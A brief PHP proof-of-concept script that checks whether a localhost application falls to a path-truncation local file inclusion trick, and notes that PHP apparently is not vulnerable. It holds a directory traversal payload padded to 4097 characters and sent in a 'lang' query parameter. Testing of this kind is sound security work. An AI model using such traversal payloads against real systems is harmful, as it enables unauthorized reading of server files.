<?php

// PHP does not appear to be vulnerable to the path truncation vulnerability
// mentioned in point 1 of https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a

$targetLength = 4097;

$targetFile = '../log/application.log/';

$basePath = "http://localhost:8000?lang=" . $targetFile;

$url = str_pad($basePath, $targetLength, './');

file_get_contents($url);